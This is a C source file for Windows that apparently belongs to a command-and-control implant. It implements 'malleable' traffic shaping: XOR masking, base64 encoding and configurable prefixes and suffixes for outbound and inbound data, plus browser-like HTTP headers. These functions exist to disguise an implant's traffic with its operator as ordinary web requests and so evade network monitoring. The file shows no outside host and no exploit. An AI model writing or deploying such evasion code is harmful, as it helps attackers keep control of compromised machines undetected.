#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "../../include/malleable.h"
#include "../../include/base64.h"

static void xor_mask(BYTE *buf, DWORD len) {
    if (MALLEABLE_MASK_KEY == 0) return;
    BYTE k = (BYTE)MALLEABLE_MASK_KEY;
    for (DWORD i = 0; i < len; i++) buf[i] ^= k;
}

static DWORD strip_prefix_suffix(const BYTE *in, DWORD in_len, const char *pre, const char *suf,
                                 BYTE *out, DWORD out_cap) {
    DWORD start = 0, end = in_len;
    DWORD plen = (DWORD)lstrlenA(pre);
    DWORD slen = (DWORD)lstrlenA(suf);
    if (plen > 0 && in_len >= plen && memcmp(in, pre, plen) == 0) start = plen;
    if (slen > 0 && end > start + slen &&
        memcmp(in + end - slen, suf, slen) == 0) end -= slen;
    DWORD n = end - start;
    if (n > out_cap) n = out_cap;
    CopyMemory(out, in + start, n);
    return n;
}

DWORD malleable_encode_outbound(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_cap) {
    BYTE tmp[MAX_OUTPUT_SIZE];
    DWORD len = in_len;
    if (len > sizeof(tmp)) len = sizeof(tmp);
    CopyMemory(tmp, in, len);

    xor_mask(tmp, len);

    if (MALLEABLE_OUT_BASE64) {
        char b64[MAX_OUTPUT_SIZE * 2];
        DWORD blen = b64_encode(tmp, len, b64, sizeof(b64));
        len = blen;
        CopyMemory(tmp, b64, len);
    }

    const char *pre = MALLEABLE_OUT_PREPEND;
    const char *suf = MALLEABLE_OUT_APPEND;
    DWORD plen = (DWORD)lstrlenA(pre);
    DWORD slen = (DWORD)lstrlenA(suf);
    if (plen + len + slen > out_cap) return 0;
    CopyMemory(out, pre, plen);
    CopyMemory(out + plen, tmp, len);
    CopyMemory(out + plen + len, suf, slen);
    return plen + len + slen;
}

DWORD malleable_decode_inbound(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_cap) {
    BYTE tmp[MAX_OUTPUT_SIZE];
    DWORD len = strip_prefix_suffix(in, in_len, MALLEABLE_IN_PREPEND, MALLEABLE_IN_APPEND, tmp, sizeof(tmp));

    if (MALLEABLE_IN_BASE64) {
        BYTE dec[MAX_OUTPUT_SIZE];
        len = b64_decode((const char *)tmp, len, dec, sizeof(dec));
        CopyMemory(tmp, dec, len);
    }

    xor_mask(tmp, len);
    if (len > out_cap) len = out_cap;
    CopyMemory(out, tmp, len);
    return len;
}

void malleable_build_headers(wchar_t *buf, DWORD buf_chars) {
    char hdr[512];
    _snprintf(hdr, sizeof(hdr), "Accept: %s\r\nAccept-Language: %s\r\nContent-Type: application/json\r\n",
              HTTP_HDR_ACCEPT, HTTP_HDR_ACCEPT_LANGUAGE);
    MultiByteToWideChar(CP_UTF8, 0, hdr, -1, buf, (int)buf_chars);
}
